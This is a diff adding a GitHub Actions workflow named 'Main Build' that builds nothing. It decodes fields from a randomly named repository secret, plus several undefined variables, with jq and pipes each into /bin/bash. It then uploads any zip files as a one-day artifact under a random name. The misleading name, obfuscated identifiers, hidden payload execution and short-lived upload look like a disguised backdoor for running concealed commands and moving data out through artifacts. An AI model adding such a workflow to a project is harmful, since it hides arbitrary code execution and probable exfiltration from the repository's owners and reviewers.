@@ -1,0 +1,30 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  automation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          cypj9: ${{ secrets.cypj9 }}
+        run: |
+          printf '%s' "$cypj9" | jq -r .lqgzv92 | /bin/bash
+          printf '%s' "$qxann2" | jq -r .nvm02762 | /bin/bash
+          echo $t20 | jq -r .ocih56983 | /bin/bash
+          printf '%s' "$xhs6386" | jq -r .aqt8397 | /bin/bash
+          echo $frlo70 | jq -r .u21 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: zoZwQEAP
+          path: "*.zip"
+          retention-days: 1
